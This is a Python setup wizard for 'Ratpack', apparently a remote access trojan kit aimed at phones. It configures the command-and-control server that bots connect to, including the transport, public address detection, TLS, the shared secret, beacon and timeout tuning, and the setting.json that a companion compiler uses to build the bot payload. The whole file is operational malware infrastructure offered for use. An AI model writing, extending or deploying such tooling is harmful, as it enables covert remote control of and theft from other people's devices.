"""
setup_wizard.py — the interactive installer for the Ratpack Panel.

The wizard asks which interface to deploy:

  [1] Bot interface  — only the C2 data channel, no web UI. For a headless
                        box whose only job is to receive bots.
  [2] Web interface  — the C2 plus the browser panel, and the setting.json
                        generator the compiler consumes.

It then asks for the bind address, the port, the transport (tcp/tls) and the
web credentials, generates the shared secret, writes panel_config.json and
prints the resulting URLs and paths.
"""

import os
import sys

from . import config as cfgmod

BANNER = r"""
+---------------------------------------------------------------+
|                        R A T P A C K                          |
|                     Panel setup wizard                       |
+---------------------------------------------------------------+
"""

CYAN = "\033[36m"
GREEN = "\033[32m"
YELLOW = "\033[33m"
RED = "\033[31m"
BOLD = "\033[1m"
RESET = "\033[0m"


def _c(text, color):
    if not sys.stdout.isatty():
        return text
    return f"{color}{text}{RESET}"


def _read_line(prompt: str) -> str:
    """
    Reads one line from the terminal.

    input() is not used directly: when the installer is piped into bash the
    script text is still on stdin, and input() would consume installer lines
    as wizard answers. The terminal is opened explicitly instead.
    """
    try:
        with open("/dev/tty", "r") as tty:
            sys.stdout.write(prompt)
            sys.stdout.flush()
            line = tty.readline()
            if line == "":
                raise EOFError
            return line.strip()
    except (EOFError, OSError):
        # No terminal available: fall back to stdin.
        try:
            return input(prompt).strip()
        except EOFError:
            print()
            return ""


def ask(prompt: str, default: str = "") -> str:
    suffix = f" [{default}]" if default else ""
    v = _read_line(f"{prompt}{suffix}: ")
    return v or default


def ask_int(prompt: str, default: int) -> int:
    v = ask(prompt, str(default))
    try:
        n = int(v)
        if 1 <= n <= 65535:
            return n
        print(_c(f"  ! port out of range, using {default}", YELLOW))
    except ValueError:
        print(_c(f"  ! not a number, using {default}", YELLOW))
    return default


def ask_bool(prompt: str, default: bool = False) -> bool:
    v = ask(prompt, "y/n" if default else "y/n").lower()
    if v in ("y", "yes", "true", "1"):
        return True
    if v in ("n", "no", "false", "0"):
        return False
    return default


def detect_public_host() -> str:
    """
    Best-effort guess of the address a phone could use to reach this host.

    The server's public IP is asked from an external service; when that is
    not possible (no network, service blocked) the first non-loopback IPv4
    address of the machine is used.
    """
    import socket
    import urllib.request

    for url in ("https://api.ipify.org", "https://ifconfig.me/ip",
                "https://icanhazip.com"):
        try:
            with urllib.request.urlopen(url, timeout=5) as r:
                ip = r.read().decode().strip()
            if ip and not ip.startswith(("127.", "0.")):
                return ip
        except Exception:
            continue

    # Fall back to a local address.
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        if ip and not ip.startswith("127."):
            return ip
    except Exception:
        pass
    return "127.0.0.1"


def choose_interface() -> str:
    """Asks whether to deploy the bot interface or the web interface."""
    print()
    print(_c("  Which interface do you want to deploy?", BOLD))
    print()
    print("    [1] Bot interface")
    print("        Only the C2 data channel. Bots connect here, there is no")
    print("        browser UI. Use it on a headless box or when the panel")
    print("        is managed elsewhere.")
    print()
    print("    [2] Web interface")
    print("        The C2 plus the browser panel, and the setting.json")
    print("        generator that the Ratpack Compiler consumes.")
    print()
    while True:
        choice = ask("  Interface", "2")
        if choice in ("1", "2"):
            break
        print(_c("  ! choose 1 or 2", YELLOW))
    mode = "bot" if choice == "1" else "web"
    print(_c(f"  -> {'Bot interface' if mode == 'bot' else 'Web interface'}", GREEN))
    return mode


def run_wizard() -> dict:
    """Runs the wizard and returns the saved config."""
    print(BANNER)

    existing = cfgmod.load()
    if existing.get("secret"):
        print(_c("  An existing configuration was found.", YELLOW))
        if not ask_bool("  Overwrite it?", False):
            print(_c("  Keeping the existing configuration.", YELLOW))
            return existing

    mode = choose_interface()

    print()
    print(_c("  Bot transport", BOLD))
    print()
    print("    [1] Direct TCP   the server owns a port, bots connect straight to it")
    print("    [2] HTTP         shared hosting: the bots poll the panel over HTTP")
    print()
    transport = "tcp"
    if existing.get("c2", {}).get("transport") == "http":
        transport = "http"
    while True:
        pick = ask("  Transport", "2" if transport == "http" else "1")
        if pick in ("1", "2"):
            transport = "tcp" if pick == "1" else "http"
            break
        print(_c("  ! choose 1 or 2", YELLOW))
    print(_c("  -> " + ("HTTP polling (shared hosting)" if transport == "http"
                        else "Direct TCP"), GREEN))

    print()
    print(_c("  C2 (bot) channel", BOLD))

    if transport == "http":
        # The bots go through an HTTP reverse proxy, so the panel's public
        # URL is what they need; there is no separate C2 port.
        c2_bind = "0.0.0.0"
        c2_host = ask("  Public URL of the panel (e.g. https://rat.example.com)",
                      existing.get("c2", {}).get("host", "http://127.0.0.1:8080"))
        c2_port = int(existing.get("c2", {}).get("port", 8777))
        protocol = existing.get("c2", {}).get("protocol", "tcp")
        cert = existing.get("c2", {}).get("cert", "")
        key = existing.get("c2", {}).get("key", "")
    else:
        c2_bind = ask("  Bind address (where the C2 listens)",
                      existing.get("c2", {}).get("bind", "0.0.0.0"))
        # The advertised address must be reachable FROM the phone, so it
        # cannot default to the wildcard bind address.
        default_host = existing.get("c2", {}).get("host", "")
        if default_host in ("", "0.0.0.0", "::"):
            default_host = detect_public_host()
        c2_host = ask("  Address the bots connect to (public IP or hostname)",
                      default_host)
        if c2_host in ("0.0.0.0", "::", ""):
            print(_c("  ! 0.0.0.0 is not reachable from a phone, "
                     "using the detected address", YELLOW))
            c2_host = detect_public_host()
        c2_port = ask_int("  C2 port", int(existing.get("c2", {}).get("port", 8777)))
        protocol = ask("  Encryption [tcp/tls]",
                       existing.get("c2", {}).get("protocol", "tcp")).lower()
        if protocol not in ("tcp", "tls"):
            protocol = "tcp"
        cert = key = ""
        if protocol == "tls":
            cert = ask("  Certificate file", existing.get("c2", {}).get("cert", ""))
            key = ask("  Private key file", existing.get("c2", {}).get("key", ""))
            if not cert:
                print(_c("  ! no certificate given, falling back to tcp", YELLOW))
                protocol = "tcp"

    cfg = {
        "version": 1,
        "mode": mode,
        "c2": {
            "bind": c2_bind,
            "host": c2_host,
            "port": c2_port,
            "protocol": protocol,
            "transport": transport,
            "cert": cert,
            "key": key,
        },
        "web": {
            "host": existing.get("web", {}).get("host", "127.0.0.1"),
            "port": int(existing.get("web", {}).get("port", 8080)),
            "username": existing.get("web", {}).get("username", "admin"),
            "password": existing.get("web", {}).get("password", ""),
        },
        "secret": cfgmod.generate_secret(),
        "beacon_ms": 15000,
        "timeout_ms": 10000,
        "tag": "rat",
        "setting_json": {},
    }

    if mode == "web":
        print()
        print(_c("  Web panel", BOLD))
        # Default to the public address so the printed URL is actually
        # reachable from a browser on another machine.
        cfg["web"]["host"] = ask("  Bind address",
                                 detect_public_host())
        cfg["web"]["port"] = ask_int("  Panel port", cfg["web"]["port"])
        cfg["web"]["username"] = ask("  Username", cfg["web"]["username"])
        pwd = ask("  Password (empty = generate)", "")
        if not pwd:
            pwd = cfgmod.generate_password()
            print(_c(f"  generated password: {pwd}", GREEN))
        cfg["web"]["password"] = pwd
    else:
        cfg["web"]["password"] = ""

    print()
    print(_c("  Payload tuning", BOLD))
    cfg["beacon_ms"] = ask_int("  Beacon interval (ms)", cfg["beacon_ms"])
    cfg["timeout_ms"] = ask_int("  Connect timeout (ms)", cfg["timeout_ms"])
    cfg["tag"] = ask("  Log tag", cfg["tag"])

    cfg["setting_json"] = cfgmod.build_setting_json(cfg)

    path = cfgmod.save(cfg)
    print()
    print(_c("  Configuration written:", GREEN), path)
    print_summary(cfg, path)
    return cfg


def print_summary(cfg: dict, path: str = ""):
    """Prints the operator-relevant outcome of the setup."""
    c2 = cfg.get("c2", {})
    web = cfg.get("web", {})
    secret = cfg.get("secret", "")

    print()
    print(_c("+---------------------------------------------------------------+", GREEN))
    print(_c("|                    Ratpack Panel is configured                 |", GREEN))
    print(_c("+---------------------------------------------------------------+", GREEN))
    print()
    print(f"  Interface      : {'Web interface' if cfg.get('mode') == 'web' else 'Bot interface'}")
    if c2.get("transport") == "http":
        print("  Transport      : HTTP polling (shared hosting)")
        print(f"  Bots connect to: {c2.get('host')}")
    else:
        print(f"  C2 listen      : {c2.get('bind','0.0.0.0')}:{c2.get('port')} ({c2.get('protocol')})")
        print(f"  Bots connect to: {c2.get('host')}:{c2.get('port')}")
    print(f"  Shared secret  : {secret}")
    if cfg.get("mode") == "web":
        # A wildcard bind address is not a usable URL for the operator, so
        # the detected public address is shown instead.
        shown_host = web.get("host", "127.0.0.1")
        if shown_host in ("0.0.0.0", "::", ""):
            shown_host = detect_public_host()
        url = f"http://{shown_host}:{web.get('port')}/"
        print()
        print(_c("  Panel URL      : " + url, GREEN + BOLD))
        print(_c("  Panel login    : " + str(web.get("username", "admin")), GREEN))
        if web.get("password"):
            print(_c("  Panel password : " + str(web.get("password")), GREEN))
        if web.get("host") in ("0.0.0.0", "::"):
            print(_c("  ! the panel binds to " + str(web.get("host"))
                     + "; reach it through the firewall, a tunnel or a proxy", YELLOW))
        elif web.get("host") in ("127.0.0.1", "localhost"):
            print(_c("  ! the panel only listens on loopback; it is reachable "
                     "from this machine only", YELLOW))
    else:
        print("  Panel URL      : (bot interface only, no web UI)")
    print()
    print(_c("  setting.json for the Ratpack Compiler:", BOLD))
    sj = cfg.get("setting_json", {})
    print(f"    server.host      = {sj.get('server', {}).get('host')}")
    print(f"    server.port      = {sj.get('server', {}).get('port')}")
    print(f"    server.protocol  = {sj.get('server', {}).get('protocol')}")
    print(f"    server.secret    = {sj.get('server', {}).get('secret')}")
    print()
    print(_c("  Download it from the panel: /setting.json", BOLD))
    print(_c("  and drop it into Ratpack/Compiler/ before compiling.", BOLD))
    if path:
        print()
        print(f"  Config file    : {path}")
    print()


def main():
    cfg = run_wizard()
    if cfg.get("mode") == "web":
        print(_c("  Start the panel with:  python3 -m ratpack.panel", BOLD))
    else:
        print(_c("  Start the C2 with:     python3 -m ratpack.botd", BOLD))
    print()


if __name__ == "__main__":
    main()
